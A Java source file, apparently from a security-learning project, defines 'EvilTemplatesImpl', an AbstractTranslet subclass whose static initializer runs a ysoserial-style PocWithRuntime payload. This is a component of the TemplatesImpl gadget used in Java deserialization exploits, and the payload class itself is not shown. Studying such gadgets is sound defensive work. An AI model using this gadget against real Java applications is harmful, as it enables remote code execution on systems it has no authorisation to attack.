package com.xjjlearning.hack.java.classloader.bytecodes;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.xjjlearning.hack.java.ysoserial.payloads.util.PocWithRuntime;

public class EvilTemplatesImpl extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
    static {
        // System.out.println("hello, xjj");
        new PocWithRuntime();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}